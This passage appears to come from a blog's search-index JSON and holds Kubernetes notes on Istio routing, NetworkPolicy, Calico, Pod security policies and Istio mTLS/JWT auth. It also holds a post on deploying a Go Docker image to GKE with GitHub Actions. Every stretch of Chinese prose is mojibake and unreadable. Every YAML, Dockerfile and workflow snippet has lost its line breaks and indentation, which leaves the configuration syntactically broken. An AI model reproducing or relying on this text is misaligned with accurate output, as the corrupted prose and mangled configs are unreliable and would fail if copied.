çš„è¿‡ç¨‹ä¸­ä¾ç„¶ä¼šå—åˆ° iptables è§„åˆ™çº¦æŸï¼Œè¿™æ ·æ˜¯ä¸æ˜¯ä¼šå›åˆ°ç¬¬ä¸€æ­¥ï¼Œåˆè¢«è½¬å‘åˆ° 15001 ç«¯å£å‘¢ï¼Ÿä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œiptables ä¸­é…ç½®äº†ä¸€æ¡ç‰¹æ®Šçš„è§„åˆ™ï¼Œæ”¾è¡Œç‰¹å®šç”¨æˆ·ï¼ˆUID=1337ï¼‰çš„æµé‡ï¼Œè€Œ Sidecar å®¹å™¨æ­£æ˜¯é€šè¿‡è¿™ä¸ªç”¨æˆ·è¿è¡Œçš„ istio-proxyï¼Œå› æ­¤ç¬¬å››æ­¥çš„æµé‡ä¸ä¼šè¢« iptables æ‹¦æˆªã€‚ è€Œå¯¹äºå…¥æ–¹å‘çš„ TCP æµé‡ï¼Œæµç¨‹æ˜¯ä¸€è‡´çš„ï¼ŒåŒºåˆ«ä»…åœ¨äº 15001 å˜æˆäº† 15006 ç«¯å£ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:16:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æµé‡ç®¡ç† Istio èƒ½æä¾›æ›´ç²¾ç»†åŒ–çš„æµé‡ç®¡ç†ï¼Œä¾‹å¦‚å°† 95% çš„æµé‡è´Ÿè½½å‡è¡¡ç»™ç”Ÿäº§ç¯å¢ƒçš„æœåŠ¡ã€å°† 5% çš„æµé‡å‘é€åˆ°é‡‘ä¸é›€å‘å¸ƒçš„æœåŠ¡ï¼Œæˆ–æ˜¯å°†æ¥è‡ªä¸åŒå®¢æˆ·ç«¯çš„æµé‡è½¬å‘åˆ°ä¸åŒç‰ˆæœ¬çš„æœåŠ¡ç­‰ç­‰ã€‚ä¸è¿‡ï¼Œè™½ç„¶ Envoy æ”¯æŒå¤šç§è´Ÿè½½å‡è¡¡ç®—æ³•ï¼ŒIstio ç›®å‰åªæ”¯æŒè½®è¯¢ã€éšæœºå’Œå¸¦æƒé‡çš„æœ€å°‘è¯·æ±‚ç®—æ³•ã€‚ é™¤äº†è´Ÿè½½å‡è¡¡ä¹‹å¤–ï¼ŒIstio å’Œ Envoy ç»“åˆè¿˜æ”¯æŒå¥åº·æ£€æŸ¥ã€è¶…æ—¶å¤„ç†ã€ç»†ç²’åº¦ç†”æ–­æœºåˆ¶ã€é‡è¯•æœºåˆ¶ã€æµé‡æ§åˆ¶ã€é”™è¯¯æ³¨å…¥ç­‰ä¸°å¯ŒåŠŸèƒ½ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:16:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"VirtualService ä¾‹å¦‚ï¼Œæˆ‘ä»¬å°† 25% æµé‡åˆ†ç»™ v2 ç‰ˆæœ¬ï¼Œå‰©ä½™ 75% ç»™ v1 ç‰ˆæœ¬ï¼Œå¹¶å¼•å…¥è¶…æ—¶ã€é‡è¯•ã€é”™è¯¯æ³¨å…¥æœºåˆ¶ï¼š apiVersion:networking.istio.io/v1beta1kind:VirtualServicemetadata:name:reviewsspec:hosts:- reviews # FQDNhttp:- route:- destination:host:reviewssubset:v1weight:75- destination:host:reviewssubset:v2weight:25timeout:10sretries:# retry if upstream server send 5xxattempts:3perTryTimeout:2sfault:# send 500 to 80% clientabort:httpStatus:500percentage:value:80 ä¸€ä¸ªå¸¸è§çš„ç”¨æ³•æ˜¯é…åˆ Gateway å‘å¸ƒæœåŠ¡ï¼š apiVersion:networking.istio.io/v1beta1kind:VirtualServicemetadata:name:simplespec:gateways:- simplehosts:- simple.comhttp:- match:- port:80route:- destination:host:simple.simple.svc.cluster.localport:number:80---apiVersion:networking.istio.io/v1beta1kind:Gatewaymetadata:name:simplespec:selector:istio:ingressgatewayservers:- hosts:- simple.comport:name:http-simplenumber:80protocol:HTTP æˆ–è€…ä½¿ç”¨æ¡ä»¶è§„åˆ™ï¼Œé…åˆ DestinationRule è®¾ç½®çµæ´»çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼š apiVersion:networking.istio.io/v1beta1kind:VirtualServicemetadata:name:canaryspec:hosts:- canaryhttp:- match:# if header[\"user\"]==\"merc\", go to v2- headers:user:exact:mercroute:- destination:host:canarysubset:v2- route:- destination:host:canarysubset:v1---apiVersion:networking.istio.io/v1alpha3kind:DestinationRulemetadata:name:canaryspec:host:canarytrafficPolicy:# default to RANDOMloadBalancer:simple:RANDOMsubsets:- name:v1 # RANDOM inside v1labels:version:v1- name:v2labels:version:v2trafficPolicy:# RR inside v2loadBalancer:simple:ROUND_ROBIN é™¤äº†è¿™äº›ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ mirror å­—æ®µå®ç°æµé‡é•œåƒã€delegate å­—æ®µè¿›è¡Œè§„åˆ™å§”æ‰˜ç­‰ã€ä¸º Gateway é…ç½® TLSã€ç”¨ DestinationRule å®ç°æ–­è·¯å™¨ç­‰ã€‚æ›´å¤šç”¨æ³•å¯ä»¥å‚è€ƒ å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:16:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å®‰å…¨ ","date":"2021-10-10","objectID":"/kubernetes/:17:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å®¹å™¨è¿è¡Œæ—¶å®‰å…¨ ä¸€èˆ¬ä¸å…è®¸ä½¿ç”¨ root ç”¨æˆ·è¿è¡Œå®¹å™¨ï¼Œé˜²æ­¢æƒé™è¿‡é«˜ã€‚é›†ç¾¤ä¸­ä¹Ÿéœ€è¦ä¿è¯å®¹å™¨ä¸å®¹å™¨é—´ã€å®¹å™¨ä¸ä¸»æœºé—´éš”ç¦»ï¼Œå¹¶éµå¾ªæœ€å°ç‰¹æƒåŸåˆ™ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸€ç›®æ ‡ï¼Œå¸¸ç”¨çš„æ‰‹æ®µåŒ…æ‹¬ Pod å®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆPod Security Contextï¼‰ã€API Server çš„è®¤è¯ã€æˆæƒã€å®¡è®¡ã€å‡†å…¥ã€ä»¥åŠæ•°æ®åŠ å¯†ç­‰æœºåˆ¶ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:17:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"é›†ç¾¤å®‰å…¨ Kubernetes çš„ API é€šä¿¡éƒ½åŸºäº TLSï¼Œå®ç°äº†ä¼ è¾“è¿‡ç¨‹ä¸­çš„åŠ å¯† å®šä¹‰ EncryptionConfiguration å¯¹è±¡å¯ä»¥å¯¹å­˜å‚¨è¿›è¡ŒåŠ å¯† ä½¿ç”¨ NodeRestriction å‡†å…¥æ§åˆ¶æ’ä»¶å¯ä»¥é˜²æ­¢ kubelet ä¿®æ”¹å¸¦ node-restriction.kubernetes.io/ æ ‡ç­¾çš„èŠ‚ç‚¹ï¼Œé™ä½ kubeconfig æ³„éœ²é€ æˆçš„å±å®³ Pod å®‰å…¨ç­–ç•¥åˆ™æ›´ç»†ç²’åº¦åœ°é™åˆ¶äº†ç”¨æˆ·å¯¹ Pod çš„æ“ä½œï¼š Container-level Security Context ä»…åº”ç”¨åˆ°æŒ‡å®šçš„å®¹å™¨ Pod-level Security Context åº”ç”¨åˆ° Pod å†…æ‰€æœ‰å®¹å™¨ï¼ˆå’Œ Volumeï¼‰ Pod Security Policies åˆ™åº”ç”¨åˆ°æ•´ä¸ªé›†ç¾¤å†…éƒ¨çš„æ‰€æœ‰ Podï¼ˆå’Œ Volumeï¼‰ ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨ Container-level Security Context ä¸­ç¦æ­¢ç‰¹æƒè¿è¡Œï¼Œä¹Ÿå¯ä»¥å°† securityContext å­—æ®µæåˆ°å’Œ containers åŒçº§ä½œä¸º Pod-level Security Contextï¼š apiVersion:apps/v1kind:Deploymentmetadata:name:nginx-deploymentspec:replicas:1selector:matchLabels:app:nginxtemplate:metadata:labels:app:nginxspec:containers:- name:nginximage:nginxsecurityContext:privileged:false Pod Security Policies åˆ™éœ€è¦ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å¯¹è±¡ç¼–å†™ï¼Œä¾‹å¦‚é™åˆ¶ç«¯å£èŒƒå›´ï¼š apiVersion:policy/v1beta1kind:PodSecurityPolicymetadata:name:examplespec:privileged:falseseLinux:rule:RunAsAnysupplementalGroups:rule:RunAsAnyrunAsUser:rule:RunAsAnyfsGroup:rule:RunAsAnyhostPorts:- min:8000max:8080volumes:- '*' æœ€åï¼Œä¹‹å‰æåˆ°çš„ Taint æœºåˆ¶ä¹Ÿå¯ä»¥ç”¨äºé›†ç¾¤èŠ‚ç‚¹é—´çš„å®‰å…¨éš”ç¦»ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:17:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"NetworkPolicy Kubernetes é»˜è®¤æä¾›äº† NetworkPolicy å¯¹è±¡å®ç°ä¸‰å±‚/å››å±‚ç½‘ç»œæµé‡çš„æ§åˆ¶ï¼Œæ¦‚å¿µä¸Šç±»ä¼¼é˜²ç«å¢™ã€‚ä¸è¿‡ï¼Œè¦ä½¿ç”¨ NetworkPolicyï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨æ”¯æŒ NetworkPolicy çš„ CNIã€‚NetworkPolicy çš„è¯­ä¹‰éå¸¸ç›´è§‚ï¼Œå’Œé˜²ç«å¢™è§„åˆ™ç±»ä¼¼ï¼š apiVersion:networking.k8s.io/v1kind:NetworkPolicymetadata:name:test-network-policynamespace:defaultspec:podSelector:matchLabels:role:dbpolicyTypes:- Ingress- Egressingress:- from:- ipBlock:cidr:172.17.0.0/16except:- 172.17.1.0/24- namespaceSelector:matchLabels:project:myproject- podSelector:matchLabels:role:frontendports:- protocol:TCPport:6379egress:- to:- ipBlock:cidr:10.0.0.0/24ports:- protocol:TCPport:5978 ä¸Šé¢çš„ NetworkPolicy ä¼šåº”ç”¨åˆ° default Namespace ä¸‹å¸¦ role=db æ ‡ç­¾çš„æ‰€æœ‰ Pod ä¸Šï¼Œå…è®¸æ¥è‡ªé™¤ 172.17.1.0/24 å¤–æ‰€æœ‰ 172.17.0.0/16 çš„å…¥ç«™æµé‡ã€å…è®¸æ¥è‡ªå¸¦ project=myproject æ ‡ç­¾çš„æ‰€æœ‰ Namespace çš„å…¥ç«™æµé‡ã€å…è®¸ default Namespace ä¸‹å¸¦ role=frontend æ ‡ç­¾çš„æ‰€æœ‰ Pod çš„ å…¥ç«™æµé‡å‘é€åˆ° TCP 6379 ç«¯å£ä¸Šã€‚åŒæ—¶å…è®¸è®¿é—® 10.0.0.0/24 ç½‘æ®µ TCP 5978 ç«¯å£çš„å‡ºç«™æµé‡ã€‚ å¦‚æœ podSelector è®¾ä¸º {}ï¼Œåˆ™ä¼šåº”ç”¨åˆ°æ‰€æœ‰ Pod ä¸Šï¼›å¦‚æœ ingress æˆ– egress å­—æ®µè®¾ä¸º {}ï¼Œåˆ™ä¼šå…è®¸æ‰€æœ‰å…¥ç«™/å‡ºç«™æµé‡ã€‚ Calico åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¼€å‘äº†è‡ªå·±çš„ NetworkPolicy æ‰©å±•äº†å…¶åŠŸèƒ½ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCalico çš„ NetworkPolicy å’Œé»˜è®¤ NetworkPolicy åŒåä½†å¹¶éåŒä¸€ä¸ªå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹è§„åˆ™å…è®¸é›†ç¾¤å†…æ‰€æœ‰ ping è¯·æ±‚ï¼š apiVersion:projectcalico.org/v3kind:GlobalNetworkPolicymetadata:name:allow-ping-in-clusterspec:selector:all()types:- Ingressingress:- action:Allowprotocol:ICMP# notProtocol: TCP # do not match this protocolsource:# nets: # IP range# namespaceSelector: # namespace label selector# ports:# - 80 # single port# - 6040:6050 # port range# destination: # target addressselector:all() # pod label selectoricmp:type:8# Ping request- action:Allowprotocol:ICMPv6source:selector:all()icmp:type:128# Ping request# serviceAccountSelector: # apply rules to this SA ä¸Šè¿°è§„åˆ™åªå±•ç¤ºäº† ingress è§„åˆ™ï¼ŒåŒç†å¯ä»¥è¿ç”¨äº egressã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥é…ç½® GlobalNetworkPolicy åº”ç”¨äºé›†ç¾¤ä¸­æ‰€æœ‰ Namespaceï¼Œå¹¶ä¸”èƒ½é™åˆ¶ Pod å’Œä¸»æœºä¹‹é—´çš„æµé‡ï¼Œè¿™æ˜¯é»˜è®¤ NetworkPolicy åšä¸åˆ°çš„ã€‚å¯ä»¥æƒ³åˆ°ï¼ŒCalico çš„ NetworkPolicy ä¹Ÿæ˜¯åŸºäº iptables å®ç°çš„ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:17:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Istio å®‰å…¨ä¿è¯ Istio æ‹¥æœ‰è‡ªå·±çš„ CA ä»¥æ”¯æŒ TLS åŒå‘è®¤è¯ï¼Œè¿™æ˜¯é€šè¿‡ Sidecar ä¸Šçš„ Envoy å®ç°çš„ã€‚Istio é€šè¿‡ Service Identity ç¡®å®šä¸€ä¸ªè¯·æ±‚æºçš„èº«ä»½ï¼Œåœ¨ Kubernetes ä¸­å¯¹åº” Service Accountã€‚ å½“å·¥ä½œè´Ÿè½½å¯åŠ¨æ—¶ï¼ŒEnvoy é€šè¿‡ Secret Discovery Service å‘ istio-agent å‘é€è¯ä¹¦å’Œå¯†é’¥è¯·æ±‚ï¼Œåè€…äº¤ç”± istiod CA ç­¾åç”Ÿæˆè¯ä¹¦åè¿”å›ã€‚åç»­çš„è¯ä¹¦æœ‰æ•ˆæœŸæ›´æ–°åˆ™ç”± istio-agent è´Ÿè´£ã€‚ ä¾‹å¦‚ï¼Œåœ¨ DestinationRule ä¸­å¯ä»¥å¼€å¯ TLS åŒå‘è®¤è¯ï¼š apiVersion:networking.istio.io/v1beta1kind:DestinationRulemetadata:name:ratings-istio-mtlsspec:host:ratings.prod.svc.cluster.localtrafficPolicy:tls:mode:ISTIO_MUTUAL# SIMPLE / MUTUAL / ISTIO_MUTUAL å·¥ä½œè´Ÿè½½é—´çš„é€šä¿¡ä¸»è¦é€šè¿‡ PeerAuthentication è®¤è¯ï¼Œé»˜è®¤ä½¿ç”¨ Permissive æ¨¡å¼ï¼Œå³ä¼˜å…ˆä½¿ç”¨ mTLSï¼Œä½†åŒæ ·æ”¯æŒæ˜æ–‡é€šä¿¡ï¼Œæ–¹ä¾¿æœåŠ¡è¿ç§»ã€‚Strict å’Œ Disable æ¨¡å¼åˆ™å¯¹åº”å¼ºåˆ¶ mTLS å’Œå¼ºåˆ¶æ˜æ–‡ä¸¤ä¸ªæç«¯ã€‚æ­¤å¤–ï¼ŒmTLS æ¨¡å¼é€‰æ‹©å¯ä»¥ç»†åŒ–åˆ°ç«¯å£çº§åˆ«ã€‚ apiVersion:security.istio.io/v1beta1kind:PeerAuthenticationmetadata:name:example-peer-policynamespace:foospec:selector:matchLabels:app:reviewsmtls:mode:STRICT# PERMISSIVE / STRICT / DISABLE# portLevelMtls:# 80:# mode: DISABLE RequestAuthentication åˆ™æ˜¯ç”¨æˆ·è¯·æ±‚åˆ°æœåŠ¡çš„è®¤è¯ï¼Œä¸»è¦åŸºäº JWTã€‚æˆ‘ä»¬å¯ä»¥é…ç½®è§„åˆ™å¯¹è¯·æ±‚æºå¸¦çš„ JWT è¿›è¡Œæ£€æŸ¥å¹¶æ‹’ç»æ— æ•ˆè¯·æ±‚ã€‚ apiVersion:security.istio.io/v1beta1kind:RequestAuthenticationmetadata:name:defaultnamespace:istio-systemspec:selector:matchLabels:istio:ingress-gatewayjwtRules:- issuer:\"testing@secure.istio.io\"jwksUri:\"https://raw.githubusercontent.com/istio/istio/release-1.12/security/tools/jwt/samples/jwks.json\" åŒæ ·åœ°ï¼Œæˆæƒä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œé€šè¿‡ AuthorizationPolicy é…ç½® rules å­—æ®µæ¥ ALLOW æˆ– DENY ç›¸åº”çš„è¯·æ±‚ã€‚ apiVersion:security.istio.io/v1beta1kind:AuthorizationPolicymetadata:name:httpbinnamespace:foospec:selector:matchLabels:app:httpbinversion:v1action: ALLOW # default value:DENYrules:- from:- source:principals:[\"cluster.local/ns/default/sa/sleep\"]- source:# ORnamespaces:[\"dev\"]to:- operation:methods:[\"GET\"]when:- key:request.auth.claims[iss]values:[\"https://accounts.google.com\"] éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œsource å­—æ®µä¸‹çš„ principals å¦‚æœè®¾ä¸º [*]ï¼Œåˆ™ä»£è¡¨åªå…è®¸ç»è¿‡è®¤è¯çš„ç”¨æˆ·ã€‚å¦‚æœéœ€è¦å…¬å¼€è®¿é—®ï¼Œå¯ä»¥ä¸å†™ source å­—æ®µã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:17:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å…¶ä»–å°šæœªå­¦ä¹ çš„æ–¹é¢ Extended Resource é›†ç¾¤è‡ªåŠ¨åŒ–ç®¡ç†ã€é›†ç¾¤é«˜å¯ç”¨ã€èŠ‚ç‚¹ç”Ÿå‘½å‘¨æœŸç®¡ç† Cluster APIã€K8s in K8s Cluster Autoscaler å¤šç§Ÿæˆ·ç®¡ç†ã€å¤šé›†ç¾¤ç®¡ç† éƒ¨ç½²æœ‰çŠ¶æ€åº”ç”¨ ","date":"2021-10-10","objectID":"/kubernetes/:18:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"GitHub Actions è¿˜å¯ä»¥é…åˆ Issue ç”¨æ¥åšå¼€æºç¤¾åŒºçš„æ— èŠå°æ¸¸æˆï¼Œè¿™å°±ç•™åˆ°ã€Šä¸‰æ¢ GitHub Actionsã€‹å†è¯´äº†ã€‚ ","date":"2021-09-25","objectID":"/dockerfile2gke/:0:0","tags":["Docker","GCP","Kubernetes","CI/CD","ARM"],"title":"å†æ¢ GitHub Actionsï¼šä» Dockerfile åˆ° GKE","uri":"/dockerfile2gke/"},{"categories":["äº‘"],"content":"èƒŒæ™¯ å’Œ ä¸Šå› ç±»ä¼¼ï¼Œæˆ‘è¿™æ¬¡åˆé‡åˆ°äº†ä¸€äº›æœºæ¢°é‡å¤çš„æ“ä½œã€‚å½“æˆ‘å†™å®Œä¸€ä¸ª Go åº”ç”¨ï¼Œæƒ³å‘å¸ƒåœ¨å…¬ç½‘ä¸Šä¾›è®¿é—®ã€åŒæ—¶ä¿è¯é«˜å¯ç”¨æ€§æ—¶ï¼Œæˆ‘éœ€è¦ï¼š è¿è¡Œ go buildï¼Œé™„å¸¦ä¸€å †å‚æ•° è¿è¡Œ docker build æ‰“åŒ… Docker é•œåƒ è¿è¡Œ docker run æµ‹è¯•é•œåƒæ˜¯å¦å¯ç”¨ï¼Œå­˜åœ¨é—®é¢˜åˆ™å›åˆ°ç¬¬ 1 æ­¥ä¹‹å‰ è¿è¡Œ docker ps å’Œ docker rm æ¸…ç†å®¹å™¨ è¿è¡Œ docker push å‘å¸ƒé•œåƒ è¿è¡Œ docker image ls å’Œ docker image rm æ¸…ç†é•œåƒ åœ¨ Google Kubernetes Engine é‡Œæ‰“å¼€ Cloud Shell è¿è¡Œ kubectl create deploy åˆ›å»º deploy è¿è¡Œ kubectl expose deploy åˆ›å»º service è¿™å®åœ¨æ˜¯å¤ªéº»çƒ¦äº†ã€‚ä¸è¿‡å’Œä¸Šæ¬¡ä¸åŒï¼Œè¿™æ¬¡çš„æ­¥éª¤å’Œå‚æ•°éƒ½å¤æ‚äº†è®¸å¤šï¼Œå› æ­¤å¤šèŠ±äº†äº›æ—¶é—´ã€‚ ","date":"2021-09-25","objectID":"/dockerfile2gke/:1:0","tags":["Docker","GCP","Kubernetes","CI/CD","ARM"],"title":"å†æ¢ GitHub Actionsï¼šä» Dockerfile åˆ° GKE","uri":"/dockerfile2gke/"},{"categories":["äº‘"],"content":"ç¼–å†™ Dockerfile æˆ‘è¿™é‡Œä½¿ç”¨äº† Muti-stage çš„æ–¹å¼ï¼Œå…ˆç¼–è¯‘åéƒ¨ç½²ï¼Œå®é™…ä¸Šä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œæœ¬åœ°ç¼–è¯‘åç›´æ¥è¿è¡Œç¬¬äºŒé˜¶æ®µã€‚ FROMgolang:1.17.1 AS builderRUN mkdir /appADD . /appWORKDIR/appRUN mkdir bin \u0026\u0026 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\"-w -s\" -gcflags \"-N -l\" -o bin/httpserverFROMalpine AS productionCOPY --from=builder /app/bin/* .CMD [\"./httpserver\", \":8080\"] éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œalpine æ‰€é‡‡ç”¨çš„ musl libc ä¼šå½±å“åˆ°ä½¿ç”¨é»˜è®¤é…ç½®ç¼–è¯‘çš„ go äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤å¿…é¡»è®¾ç½® CGO_ENABLED=0ã€‚ å†™å¥½ä¸Šé¢çš„ Dockerfile åï¼Œx64 æœºå™¨å°±å¯ä»¥ç›´æ¥æ‰“åŒ…é•œåƒäº†ï¼Œä½† M1 ä¸è¡Œï¼Œå› ä¸º M1 ä¸Šçš„ Docker æ— è®º pull è¿˜æ˜¯ build éƒ½é»˜è®¤ç”¨ ARM ç‰ˆæœ¬çš„é•œåƒã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨ buildx è¾…åŠ©ç¼–è¯‘ï¼š $ docker buildx build --platform linux/amd64 --push -t httpserver . buildx è¿˜å¯ä»¥å£°æ˜å¤šä¸ªå¹³å°ï¼Œç”¨é€—å·éš”å¼€ã€‚å½“ç„¶æ­¤æ—¶ä¹Ÿéœ€è¦ go ç¼–è¯‘å¤šä¸ªå¹³å°çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ ä¸è¿‡æœ€æ–¹ä¾¿çš„åŠæ³•å½“ç„¶æ˜¯ä½¿ç”¨ GitHub Actions å•¦ã€‚ç”±äºå’Œ GCP èåˆï¼Œæˆ‘ä»¬é€‰æ‹©æŠŠé•œåƒä¸Šä¼ åˆ° Google Container Registryï¼Œå› æ­¤ Actions è„šæœ¬ä¼šæœ‰äº›å˜åŒ–ï¼š name:Build and Deploy to GKEon:push:branches:- mainenv:PROJECT_ID:${{secrets.GKE_PROJECT}}GKE_CLUSTER:cluster-1GKE_ZONE:us-central1-cDEPLOYMENT_NAME:httpserverIMAGE:httpserverjobs:setup-build-publish-deploy:name:Setup, Build, Publish and Deployruns-on:ubuntu-lateststeps:- name:Checkoutuses:actions/checkout@v2# Setup gcloud CLI# ...# Configure Docker to use the gcloud command-line tool as a credential# helper for authentication# ...# Get the GKE credentials so we can deploy to the cluster# ...# Build the Docker image- name:Buildrun:|-docker build \\ --tag \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\" \\ --build-arg GITHUB_SHA=\"$GITHUB_SHA\" \\ --build-arg GITHUB_REF=\"$GITHUB_REF\" \\ .# Push the Docker image to Google Container Registry, maybe need storage admin role?- name:Publishrun:|-docker push \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\"# Set up kustomize# ...# Deploy the Docker image to the GKE cluster# ... ä¸Šé¢çœç•¥äº† GKE ç›¸å…³çš„ä¸€äº›é…ç½®ï¼Œæˆ‘ä»¬ä¼šåœ¨ä¸‹é¢ä»‹ç»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶æˆ‘ä»¬ç”¨ $GITHUB_SHA$ ä½œä¸ºæˆ‘ä»¬é•œåƒçš„ tagï¼Œè¿™æ˜¯å› ä¸ºéƒ¨ç½²åˆ° Kubernetes æ—¶éœ€è¦æ˜ç¡®æŒ‡å®šä¸€ä¸ª tag è€Œä¸æ˜¯ç”¨é»˜è®¤çš„ latestã€‚ ","date":"2021-09-25","objectID":"/dockerfile2gke/:2:0","tags":["Docker","GCP","Kubernetes","CI/CD","ARM"],"title":"å†æ¢ GitHub Actionsï¼šä» Dockerfile åˆ° GKE","uri":"/dockerfile2gke/"},{"categories":["äº‘"],"content":"é…ç½® GCP é¦–å…ˆå®‰è£…å¥½ gcloudï¼š # Setup gcloud CLI- uses:google-github-actions/setup-gcloud@v0.2.0with:service_account_key:${{secrets.GKE_SA_KEY}}project_id:${{secrets.GKE_PROJECT}} è¿™é‡Œçš„ GKE_PROJECT å°±æ˜¯ GKE æ‰€åœ¨çš„é¡¹ç›®çš„ Project IDï¼ŒGKE_SA_KEY æ˜¯åœ¨ GCP ä¸Šæ‰§è¡Œåç»­æ“ä½œçš„ Service Account çš„å¯†é’¥ã€‚è¿™ä¸ªå¯†é’¥å¯ä»¥åœ¨åˆ›å»º Service Account ååœ¨ â€œå¯†é’¥â€ é€‰é¡¹å¡ç”Ÿæˆï¼Œéœ€è¦çš„æ˜¯ JSON æ ¼å¼çš„å¯†é’¥ï¼Œä¸”éœ€è¦è¿›è¡Œ Base64 ç¼–ç åå¡«å…¥ secretsã€‚ éšåç™»å½• Container Registryï¼š # Configure Docker to use the gcloud command-line tool as a credential# helper for authentication- run:|-gcloud --quiet auth configure-docker è¿™ä¸€æ­¥ä¼šåˆ©ç”¨ä¸Šé¢çš„ Service Account ç™»å½• Container Registryã€‚ç”±äºåç»­è¦ä¸Šä¼ é•œåƒï¼Œæ¶‰åŠåˆ°äº† create bucket çš„æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º Service Account æ—¶æˆäºˆ Storage Admin æˆ–ç±»ä¼¼çš„æ‹¥æœ‰ create bucket æƒé™çš„è§’è‰²ï¼ˆStorage Admin æƒé™å¾ˆé«˜ï¼Œè¿™æ ·åšå¹¶ä¸ç¬¦åˆæœ€å°ç‰¹æƒåŸåˆ™ï¼‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ˜¾ç„¶ Service Account è¿˜éœ€è¦ Kubernetes Engine Developer è§’è‰²æ‰èƒ½åœ¨åé¢ç®¡ç† K8s é›†ç¾¤ã€‚ æœ€åè·å– GKE æƒé™ï¼š # Get the GKE credentials so we can deploy to the cluster- uses:google-github-actions/get-gke-credentials@v0.2.1with:cluster_name:${{env.GKE_CLUSTER}}location:${{env.GKE_ZONE}}credentials:${{secrets.GKE_SA_KEY}} éšåå°±æ˜¯ä¸Šé¢çœ‹åˆ°çš„ Build å’Œ Publish æ“ä½œäº†ã€‚ ","date":"2021-09-25","objectID":"/dockerfile2gke/:3:0","tags":["Docker","GCP","Kubernetes","CI/CD","ARM"],"title":"å†æ¢ GitHub Actionsï¼šä» Dockerfile åˆ° GKE","uri":"/dockerfile2gke/"},{"categories":["äº‘"],"content":"Customize kustomize æœ€åä¸€æ­¥å°±æ˜¯ä½¿ç”¨ kustomize æ¥æ­å»º deployã€‚åœ¨æ‰“åŒ…é•œåƒæ—¶æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯é•œåƒçš„ tag åœ¨æ¯æ¬¡ Actions æ‰§è¡Œæ—¶éƒ½æ˜¯åŠ¨æ€çš„ï¼Œæˆ‘ä»¬å¹¶ä¸æ¸…æ¥šå…¶å…·ä½“å€¼ï¼Œä¹Ÿæ— æ³•æŠŠä»–å†™è¿› deployment.yml é‡Œã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆè¿™æ ·å†™ï¼š apiVersion:apps/v1kind:Deploymentmetadata:name:httpserverspec:replicas:3selector:matchLabels:app:httpserverstrategy:rollingUpdate:maxSurge:1maxUnavailable:1minReadySeconds:5template:metadata:labels:app:httpserverspec:containers:- name:httpserverimage:gcr.io/PROJECT_ID/IMAGE:TAGports:- containerPort:8080resources:requests:cpu:100mlimits:cpu:100m---apiVersion:v1kind:Servicemetadata:name:httpserver-servicespec:type:LoadBalancerports:- port:80targetPort:8080selector:app:httpserver å¯ä»¥çœ‹åˆ° image éƒ¨åˆ†ç•™äº†ä¸€äº›åƒç¯å¢ƒå˜é‡ä¸€æ ·çš„ä¸œè¥¿ï¼Œè¿™å°±ç›¸å½“äº kustomize çš„æ¨¡ç‰ˆå­—ç¬¦ä¸²ï¼Œä¹‹å kustomize 